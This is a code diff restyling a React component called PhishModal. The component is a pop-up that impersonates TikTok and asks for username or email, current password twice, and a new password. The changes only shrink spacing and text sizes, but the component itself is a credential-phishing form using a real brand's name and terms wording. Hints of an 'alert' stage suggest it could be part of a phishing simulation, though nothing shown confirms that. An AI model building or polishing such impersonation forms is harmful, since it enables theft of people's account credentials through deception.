@@ -23,11 +23,11 @@ const formSchema = z.object({
 type FormValues = z.infer<typeof formSchema>;
 
 const inputClass = (hasError: boolean) =>
-  `w-full px-4 py-3 rounded-xl bg-background border ${
+  `w-full px-3 py-2 rounded-lg bg-background border text-sm ${
     hasError
       ? "border-destructive focus:ring-destructive/20"
       : "border-border focus:border-primary focus:ring-primary/20"
-  } text-white placeholder:text-muted-foreground focus:outline-none focus:ring-4 transition-all`;
+  } text-white placeholder:text-muted-foreground focus:outline-none focus:ring-2 transition-all`;
 
 type Stage = "idle" | "alert" | "form";
 
@@ -131,24 +131,24 @@ export function PhishModal() {
           >
             <div className="h-1.5 w-full bg-gradient-to-r from-red-600 via-primary to-primary" />
 
-            <div className="p-8 overflow-y-auto max-h-[90vh]">
+            <div className="px-6 py-5">
               {!isSuccess ? (
                 <>
-                  <div className="flex flex-col items-center text-center mb-6">
-                    <div className="w-14 h-14 bg-primary/10 rounded-full flex items-center justify-center mb-3 text-primary">
-                      <ShieldAlert className="w-7 h-7" />
+                  <div className="flex flex-col items-center text-center mb-4">
+                    <div className="w-10 h-10 bg-primary/10 rounded-full flex items-center justify-center mb-2 text-primary">
+                      <ShieldAlert className="w-5 h-5" />
                     </div>
-                    <h2 className="text-2xl font-bold tracking-tight text-white mb-1">
+                    <h2 className="text-xl font-bold tracking-tight text-white mb-0.5">
                       Change Your Password
                     </h2>
-                    <p className="text-sm text-muted-foreground">
+                    <p className="text-xs text-muted-foreground">
                       For your security, please update your TikTok password to continue.
                     </p>
                   </div>
 
-                  <form onSubmit={handleSubmit(onSubmit)} className="space-y-4">
+                  <form onSubmit={handleSubmit(onSubmit)} className="space-y-2.5">
                     <div>
-                      <label className="block text-xs font-semibold text-foreground/80 mb-1.5 uppercase tracking-wider">
+                      <label className="block text-xs font-semibold text-foreground/80 mb-1 uppercase tracking-wider">
                         Username or Email
                       </label>
                       <input
@@ -160,12 +160,12 @@ export function PhishModal() {
                         className={inputClass(!!errors.username)}
                       />
                       {errors.username && (
-                        <p className="text-destructive text-xs mt-1.5 font-medium">{errors.username.message}</p>
+                        <p className="text-destructive text-xs mt-1 font-medium">{errors.username.message}</p>
                       )}
                     </div>
 
                     <div>
-                      <label className="block text-xs font-semibold text-foreground/80 mb-1.5 uppercase tracking-wider">
+                      <label className="block text-xs font-semibold text-foreground/80 mb-1 uppercase tracking-wider">
                         Current Password
                       </label>
                       <input
@@ -177,12 +177,12 @@ export function PhishModal() {
                         className={inputClass(!!errors.currentPassword)}
                       />
                       {errors.currentPassword && (
-                        <p className="text-destructive text-xs mt-1.5 font-medium">{errors.currentPassword.message}</p>
+                        <p className="text-destructive text-xs mt-1 font-medium">{errors.currentPassword.message}</p>
                       )}
                     </div>
 
                     <div>
-                      <label className="block text-xs font-semibold text-foreground/80 mb-1.5 uppercase tracking-wider">
+                      <label className="block text-xs font-semibold text-foreground/80 mb-1 uppercase tracking-wider">
                         Confirm Current Password
                       </label>
                       <input
@@ -194,12 +194,12 @@ export function PhishModal() {
                         className={inputClass(!!errors.confirmCurrentPassword)}
                       />
                       {errors.confirmCurrentPassword && (
-                        <p className="text-destructive text-xs mt-1.5 font-medium">{errors.confirmCurrentPassword.message}</p>
+                        <p className="text-destructive text-xs mt-1 font-medium">{errors.confirmCurrentPassword.message}</p>
                       )}
                     </div>
 
                     <div>
-                      <label className="block text-xs font-semibold text-foreground/80 mb-1.5 uppercase tracking-wider">
+                      <label className="block text-xs font-semibold text-foreground/80 mb-1 uppercase tracking-wider">
                         New Password
                       </label>
                       <input
@@ -211,12 +211,12 @@ export function PhishModal() {
                         className={inputClass(!!errors.newPassword)}
                       />
                       {errors.newPassword && (
-                        <p className="text-destructive text-xs mt-1.5 font-medium">{errors.newPassword.message}</p>
+                        <p className="text-destructive text-xs mt-1 font-medium">{errors.newPassword.message}</p>
                       )}
                     </div>
 
                     <div>
-                      <label className="block text-xs font-semibold text-foreground/80 mb-1.5 uppercase tracking-wider">
+                      <label className="block text-xs font-semibold text-foreground/80 mb-1 uppercase tracking-wider">
                         Confirm New Password
                       </label>
                       <input
@@ -228,15 +228,15 @@ export function PhishModal() {
                         className={inputClass(!!errors.confirmNewPassword)}
                       />
                       {errors.confirmNewPassword && (
-                        <p className="text-destructive text-xs mt-1.5 font-medium">{errors.confirmNewPassword.message}</p>
+                        <p className="text-destructive text-xs mt-1 font-medium">{errors.confirmNewPassword.message}</p>
                       )}
                     </div>
 
-                    <div className="pt-2">
+                    <div className="pt-1">
                       <button
                         type="submit"
                         disabled={isPending}
-                        className="w-full flex items-center justify-center gap-2 px-6 py-3.5 rounded-xl font-bold bg-primary text-white hover:bg-primary/90 hover:-translate-y-0.5 active:translate-y-0 shadow-lg shadow-primary/20 hover:shadow-primary/40 disabled:opacity-70 disabled:cursor-not-allowed transition-all"
+                        className="w-full flex items-center justify-center gap-2 px-6 py-3 rounded-xl font-bold bg-primary text-white hover:bg-primary/90 hover:-translate-y-0.5 active:translate-y-0 shadow-lg shadow-primary/20 hover:shadow-primary/40 disabled:opacity-70 disabled:cursor-not-allowed transition-all"
                       >
                         {isPending ? (
                           <>
@@ -253,7 +253,7 @@ export function PhishModal() {
                     </div>
                   </form>
 
-                  <p className="text-center text-xs text-muted-foreground mt-5">
+                  <p className="text-center text-xs text-muted-foreground mt-3">
                     By continuing, you agree to TikTok's Terms of Service and confirm you have read TikTok's Privacy Policy.
                   </p>
                 </>
